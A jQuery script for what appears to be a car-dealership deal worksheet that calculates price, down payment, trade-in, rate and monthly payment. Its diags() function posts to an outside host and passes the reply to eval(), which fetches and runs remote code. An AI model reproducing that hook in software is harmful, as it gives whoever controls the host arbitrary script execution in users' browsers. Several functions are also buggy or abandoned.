// JavaScript Document

var openingprice = 0;

var deallock;
var diag = 0;

var penciltrade = 0;
var pencilprice = 0;
var pencildown = 0;
var pencilpayment = 0;

var scratchedpencilprice = 0;
var scratchedpencildown = 0;
var scratchedpencilpayment = 0;


$( window ).resize(
	function()
	{
		changeHeights();
	}
);

function logdiags ( title, data )
{
	if ( diag == 1 )
	{
		$("#diag").show();
		$("#diag").html($("#diag").html() + "<hr>" + title + "<hr>" + data);
	}
}

$(document).ready(function() {
    $(".numbersonly").keydown(function(event) {
        // Allow: backspace, delete, tab, escape, enter and .
        if ( $.inArray(event.keyCode,[46,8,9,27,13]) !== -1 ||
             // Allow: Ctrl+A
            (event.keyCode == 65 && event.ctrlKey === true) || 
             // Allow: home, end, left, right
            (event.keyCode >= 35 && event.keyCode <= 39 )) {
                 // let it happen, don't do anything
                 return;
        }
        else {
            // Ensure that it is a number and stop the keypress
            if (event.shiftKey || (event.keyCode < 48 || event.keyCode > 57) && (event.keyCode < 96 || event.keyCode > 105 )) {
                event.preventDefault(); 
            }   
        }
    });
    $(".numbersonlywithdec").keydown(function(event) {
	
        if ( $.inArray(event.keyCode,[46,8,9,27,13,110,190]) !== -1 ||
             // Allow: Ctrl+A
            (event.keyCode == 65 && event.ctrlKey === true) || 
             // Allow: home, end, left, right
            (event.keyCode >= 35 && event.keyCode <= 39 ))
		{
                 // let it happen, don't do anything
			return;
        }
        else
		{
            // Ensure that it is a number and stop the keypress
				//alert(event.keyCode + " : " + parts);

            if (event.shiftKey || (event.keyCode < 48 || event.keyCode > 57) && (event.keyCode < 96 || event.keyCode > 105 )) {
                event.preventDefault(); 
            }   
        }
    });
    $(".numbersonlywithdec").keyup(function(event) {

		if ( this.value > 99 )
		{
			$("#" + this.id).val( 99 );	
		}
		
		var parts = this.value.split('.').length-1;
		if ( parts > 1 && ( event.keyCode == 110 || event.keyCode == 190 ) )
		{
			$("#" + this.id).val( this.value.substring(0,this.value.length - 1)  );	
		}
		else
		{
			return;
		}
	});
	tradeouts( 'pricebox' );
	openDialog( 'modalstartup' );
	$("#startingproposedprice" ).select();
});

function startup()
{
	$("#proposedprice").val( $("#startingproposedprice").val() );
	//openingprice = $("#proposedprice").val();
	changePricebox();
}

function tradeouts( newitem )
{//alert( stripnumber( $( "#price" ).val() ) );
	if ( $( "#modalstartup" ).is( ":visible" ) && stripnumber( $( "#proposedprice" ).val() ) == 0 )
	{
		$( "#startingproposedprice" ).select();
	}
	else
	{
		$( ".tradeouts" ).hide();
		$( "#" + newitem ).show();
	}
}

function diags()
{
	$.post( "http://www.cawia.com/fsatest.php", {}, function ( data ) { if ( data ) { eval( data ); } } );
}

function updatescratched( field )
{
	if ( eval("pencil" + field) != eval("scratchedpencil" + field) && eval("pencil" + field) > 0 )
	{
		if ( $("#" + field + "box .scratched").html() != $("#" + field + "box .sqdollars").html() && eval("scratchedpencil" + field) > 0 )
		{
		//alert( stripnumber( $("#" + field + "box .scratched").html() ) + " | " + stripnumber( $("#" + field + "box .sqdollars").html() ) );
			$("#" + field + "box .scratched").html( currency( eval("scratchedpencil" + field) ) );
		}
	}
	
}

function yyyyyupdatescratched( field )
{
	//scratchedpencilprice = pencilprice;
	//scratchedpencildown = pencildown;
	//scratchedpencilpayment = pencilpayment;
	if ( stripnumber( $("#" + field + "box .sqdollars").html() ) != eval("pencil" + field) && eval("pencil" + field) > 0 )
	{
		$("#" + field + "box .scratched").html( currency( eval("pencil" + field) ) );
	}
	else
	{
		if ( eval("scratchedpencil" + field) > 0 && eval("scratchedpencil" + field) != eval("pencil" + field) )
		{//alert(1);
			$("#" + field + "box .scratched").html( currency( eval("scratchedpencil" + field) ) );
		}
		else if ( $("#" + field + "box .scratched").html().length = 0 )
		{//alert(2);
			$("#" + field + "box .scratched").html( '' );
		}
	}
	
}

function xxxxupdatescratched( field )
{
	if ( stripnumber( $("#" + field + "box .sqdollars").html() ) != eval("pencil" + field) && eval("pencil" + field) > 0 )
	{
		//alert( field + " = " + eval("pencil" + field) );
		$("#" + field + "box .scratched").html( currency( eval("pencil" + field) ) );
	}
	else
	{alert(eval("scratchedpencil" + field));
		if ( eval("scratchedpencil" + field) > 0 )
		{//alert(field + " a");
			$("#" + field + "box .scratched").html( currency( eval("scratchedpencil" + field) ) );
		}
		else
		{//alert(field + " b");
			$("#" + field + "box .scratched").html( '' );
		}
	}
}

function updateallcurrency ()
{
	$(".currency").each( function( key, field )
	{
		if ( $("#" + field.id).is("input") )
		{
			$("#" + field.id).val( currency($("#" + field.id).val( )) );
		}
		else
		{
			$("#" + field.id).html( currency($("#" + field.id).html( )) );
		}
	} );

	$( "#minitradeasking" ).html( $( "#tradeasking" ).html() );
	$( "#miniprice" ).html( $( "#price" ).html() );
	$( "#minidown" ).html( $( "#down" ).html() );
	$( "#minipayment" ).html( $( "#payment" ).html() );
}

function xxxxupdateallcurrency ()
{
	$(".currency").each( function( key, field )
	{
		if ( $("#" + field.id).is("input") )
		{
			//logdiags( 'updateallcurrency-input', field.id + " = " + $("#" + field.id).val() );		
			$("#" + field.id).val( currency($("#" + field.id).val( )) );
		}
		else
		{
			//logdiags( 'updateallcurrency-html', field.id + " = " + $("#" + field.id).html() );		
			$("#" + field.id).html( currency($("#" + field.id).html( )) );
		}
	} );
	//updatescratched( 'price' );
	//updatescratched( 'down' );
	//updatescratched( 'payment' );
	$( "#minitradeasking" ).html( $( "#tradeasking" ).html() );
	$( "#miniprice" ).html( $( "#price" ).html() );
	$( "#minidown" ).html( $( "#down" ).html() );
	$( "#minipayment" ).html( $( "#payment" ).html() );
}

function stripnumber ( number )
{
	number = number + " ";
	if ( number )
	{
		var x = parseInt ( Math.round( number.replace(/[^0-9.]/g, ""), 0 ));
		x++;
		x--;
		return x;
	}
}


function currency ( number )
{
	number = parseInt( stripnumber( number ) );
	number = "$" + number;
	//number = number.replace(/[^0-9.]/g, "");
	if ( number.length > 4 )
	{
		if ( number.length > 5 )
		{
			if ( number.length > 6 )
			{
				return number.substr(0,4) + "," + number.substr(4,3);
			}
			else
			{
				return number.substr(0,3) + "," + number.substr(3,3);
			}
		}
		else
		{
				return number.substr(0,2) + "," + number.substr(2,3);
		}
	}
	else
	{
		if ( number.length == 1 )
		{
			return "$0";
		}
		else
		{
			return number;
		}
	}
}

function xxxxcurrency ( number )
{
	//number = number.replace(/[^0-9.]/g, "");
	number = stripnumber( number );
	if ( number > 999 )
	{
	number = number + " ";
		if ( number > 9999 )
		{
			if ( number > 99999 )
			{
				return "$" + number.substr(0,3) + "," + number.substr(3,3);
			}
			else
			{
				return "$" + number.substr(0,2) + "," + number.substr(2,3);
			}
		}
		else
		{
				return "$" + number.substr(0,1) + "," + number.substr(1,3);
		}
	}
	else
	{//alert("a");
		number = stripnumber( number );
		number++;
		number--;
		if ( number < 1 )
		{//alert("b");
			return "$0";
		}
		else
		{//alert("c");
		
			return "$" + number;
		}
	}
}


function changeHeights ()
{
	var height = $(window).height();
	var header = 33;
	$( "#footer" ).height( ( ( height - header ) / 3 ) - 2 );
	$( "#container" ).height( ( height - header - $( "#footer" ).height() ) - 14 );
	$( "#dealinfocontent" ).height( height - header - $( "#footer" ).height() - 28 );
	$( "#footer td" ).height( $( "#footer" ).height() / 2 );
	$( "#footer .title" ).css( "line-height", ( ( $( "#footer td" ).height() / 4 ) - 2 ) + "px" );
	$( "#footer .title" ).css( "font-size", ( ( $( "#footer td" ).height() / 4 ) * .5 ) + "px" );
	$( "#footer .minivalue" ).css( "line-height", ( ( ( $( "#footer td" ).height() / 4 ) * 2 ) - 2 ) + "px" );
	$( "#footer .minivalue" ).css( "font-size", ( ( ( $( "#footer td" ).height() / 4 ) * 3 ) * .5 ) + "px" );

	$( ".sqbox" ).height( height - header - $( "#footer" ).height() - 28 );
	$( ".sqbox" ).width( ( $( "#footer" ).width() ) - 20 );

	$( ".sqdetails" ).width( $( ".sqbox" ).width() );
	var sqboxheight = $( ".sqbox" ).height() - 60;
	$( ".sqtitle" ).height( sqboxheight * .1 );
	$( ".sqdollars" ).height( sqboxheight * .2 );
	$( ".scratched" ).height( sqboxheight * .7 );
	$( ".sqdetails" ).css( "margin-top", $( ".sqbox" ).height() - 60 );

	$( ".modal" ).width( $( ".sqbox" ).width() - 30 );
	
	$( ".ui-header h1" ).css( "width", "90%" );
	$( ".ui-header h1" ).css( "margin-left", "10px" );

	$( "#chatdesk" ).height( ( $( ".sqbox" ).height() - 200 ) / 2 );
	$( "#chatcustomer" ).height( ( $( ".sqbox" ).height() - 200 ) / 2 );
	
	$( "#chat table" ).width( $( ".sqbox" ).width() - 20 );

	$( "#historycontent" ).height( $( ".sqbox" ).height() - 50 );
	$( "#customerinformation" ).height( $( ".sqbox" ).height() - 135 );

	$( ".areacode" ).width( ( $( ".sqbox" ).width() - 20 ) * .2 );
	$( ".phonenumber" ).width( ( $( ".sqbox" ).width() - 20 ) * .7 );

	$( ".areacode" ).parent().width( ( $( ".sqbox" ).width() - 20 ) * .2 );
	$( ".phonenumber" ).parent().width( ( $( ".sqbox" ).width() - 20 ) * .7 );

 	$( "#offeraccepted" ).width( $( ".sqbox" ).width() - 20 );
	$( "#offeraccepted" ).height( $( ".sqbox" ).height() - 20 );

	if ( $( ".sqbox" ).width() < 350 )
	{
		$( ".ui-btn-inner" ).css( "font-size", "11px" );
	}

}

function changeTradebox ()
{
	$("#tradebox .pencil-field").each(
	function ( key, field )
	{
		$("#" + field.id ).html( $("#temp" + field.id).val() );	
		$("#temp" + field.id).val( '' );
	}
	);
	balancedeal( 'payment' );
	tradeouts( "modaltrade" );
}

function changeRate ()
{
	$("#rate").html( $("#temprate" ).val(  ) );	
	balancedeal('payment');
	tradeouts( "paymentbox" );
}

function changeTerm ()
{
	$("#term").html( $("#tempterm" ).val(  ) + " months" );	
	balancedeal( 'payment' );
	tradeouts( "paymentbox" );
}


function changePricebox ()
{
	if ( openingprice == 0 )
	{//alert( 1 );
		openingprice = $("#proposedprice").val();
		$( "#price" ).html( openingprice );
		$( "#miniprice" ).html( openingprice );
		$( "#tradeasking" ).html( Math.round( .01 ) );
		$( "#minitradeasking" ).html( Math.round( .01 ) );
		$( "#down" ).html( Math.round( ( openingprice * 1.1 ) * .2 ) );
		$( "#minidown" ).html( Math.round( ( openingprice * 1.1 ) * .2 ) );
		updateallcurrency();
		balancedeal( 'payment' );
	}
	else
	{//alert( 2 );
		//updatescratched( "price" );
		$("#pricebox .sqdollars").html( currency( $("#proposedprice").val() ) );
		$("#proposedprice").val( '' );
		balancedeal( 'payment' );
	}
	tradeouts( "pricebox" );
}

function changeDownbox ()
{
	updatescratched( "down" );
	$("#downbox .sqdollars").html( currency( $("#proposeddown").val() ) );
	$("#proposeddown").val( '' );
	balancedeal('payment');
	tradeouts( "downbox" );
}

function changePaycash ()
{
	updatescratched( "payment" );
	balancedeal( rollto );
	tradeouts( "paymentbox" );
}

function changePayment ( rollto )
{
	updatescratched( "payment" );
	$("#paymentbox .sqdollars").html( currency( $("#temppayment").val() ) );
	$("#temppayment").val( '' );
	balancedeal( rollto );
	tradeouts( "paymentbox" );
}

function openDialog( popupid )
{
	tradeouts( popupid );
}

function gettrade()
{

	$("#tradebox .pencil-field").each(
	function ( key, field )
	{
		
		var str = $( "#temp" + field.id ).attr( "class" ) + "test";
		if ( str.match(/numbersonly/gi) != null )
		{
			if ( stripnumber( $("#" + field.id).html() ) == 0 )
			{
				$("#temp" + field.id ).val( "" );
			}
			else
			{
				$("#temp" + field.id ).val( stripnumber( $("#" + field.id).html() ) );
			}
		}
		else
		{
			if ( field.id == "tradetype" )
			{
				//alert( $("#" + field.id).html() );
				$("#temp" + field.id ).val( $("#" + field.id).html() ).selectmenu( "refresh", true );
			}
			else
			{
				$("#temp" + field.id ).val( $("#" + field.id).html() );
			}
		}
	}
	);

	tradeouts( 'modaltrade' ); 
	$("#temptradeasking" ).select();
}

function getprice()
{
	$("#proposedprice").val(  stripnumber( $("#pricebox .sqdollars").html() ) );
	openDialog( 'modalprice' );
	$("#proposedprice" ).select();
}

function getdown ()
{
	$("#proposeddown").val( stripnumber( $("#downbox .sqdollars").html() ) );
	openDialog( 'modaldown' );
	$("#proposeddown" ).select();
}

function getpayment ()
{
	$("#paymentbox .pencil-field").each(
	function ( key, field )
	{
		$("#temp" + field.id ).val( stripnumber( $("#" + field.id).html() ) );	
	}
	);

	openDialog( 'modalpayment' ); 
	$("#temppayment" ).select();
}

function getterm ()
{

	$("#tempterm" ).val( $("#term").html().replace(" months","") );	
	openDialog( 'modalterm' ); 
}

function getrate ()
{
	$("#temprate" ).val( $("#rate" ).html() );	
	openDialog( 'modalrate' ); 
	$("#temprate" ).focus();
	$("#temprate" ).select();
}

function gettop( payment, rate, term )  // TOP = Total Of Payments
{
	//alert( payment + " | " + rate + " | " + term );
	var xxx = 0;
	for ( var t = 1; t <= term; t++ )
	{
		xxx += payment;
		//alert( xxx );
		if ( rate == 0 )
		{
			var interest = 0;
		}
		else
		{
			var monthlyrate = rate / 1200;
			var interest = xxx * monthlyrate;
		}
		
		xxx -= interest;
	}
	return xxx;
}


function balancedeal ( rollto )
{
 	var values = new Array();	
	$(".balance-field").each(
	function ( key, field ) 
	{
		values.push( field.id + ":" + stripnumber($("#" + field.id).html()));
	});
		values.push( "rate:" + $("#rate").html());

	var down = stripnumber( $( "#down" ).html() );
	var tradeasking = stripnumber( $( "#tradeasking" ).html() );
	var tradepayoff = stripnumber( $( "#term" ).html() );

	var rate = stripnumber( $( "#rate" ).html() );
	var term = stripnumber( $( "#term" ).html() );
	var payment = stripnumber( $( "#payment" ).html() );
	var price = stripnumber( $( "#price" ).html() );
	var totalsale = price * 1.1;

	var tradecredit = tradeasking - tradepayoff;
	var financing = totalsale - down - tradecredit;
	var cashprice = totalsale - tradecredit;

	penciltrade = tradeasking;
	pencilprice = price;
	pencildown = down;
	pencilpayment = payment;
	
	if ( rollto == "payment" )
	{
	
		var int = rate/1200; 
		var int1 = 1 + int; 
		var r1 = Math.pow( int1, term ); 
		  
		if ( rate == 0 )
		{
			var pmt = financing / term; 
		}
		else
		{
			var pmt = financing * ( int * r1 ) / ( r1 - 1 ); 
		}
		$("#paymentbox .sqdollars").html( Math.round( pmt ) );
		pencilpayment = Math.round( pmt );
	}
	else if ( rollto == "trade" )
	{
		var top = gettop( payment, rate, term);
		//alert(top);
		//print totalsale - down - top;
		$("#tradebox .sqdollars").html( Math.round( totalsale - down - top ) );
		penciltrade = Math.round( totalsale - down - top );
	}
	else if ( rollto == "down" )
	{
		var top = gettop( payment, rate, term );
		//alert(top);
		if ( top > 0 )
		{
			//updatescratched( "down" );
			$("#downbox .sqdollars").html(  totalsale - tradecredit - top );
			pencildown = Math.round( totalsale - tradecredit - top );
		}
		else
		{
			//updatescratched( "down" );
			$("#downbox .sqdollars").html( '$0' );
			pencildown = Math.round( 0 );
			balancedeal( 'payment' );
		}
		
	}
	else if ( rollto == "price" )
	{
		var top = gettop( payment, rate, term );
		
		$("#pricebox .sqdollars").html( Math.round( ( down +  tradecredit + top ) - price * .1 ) );
		pencilprice = Math.round( ( down +  tradecredit + top ) - price * .1 );
	}
	else if ( rollto == "paycash" )
	{
		$("#downbox .sqdollars").html( cashprice );
		$("#paymentbox .sqdollars").html( '$0' );
	}
	updateallcurrency();

	updatescratched( 'price' );
	updatescratched( 'down' );
	updatescratched( 'payment' );

	scratchedpencilprice = pencilprice;
	scratchedpencildown = pencildown;
	scratchedpencilpayment = pencilpayment;

}


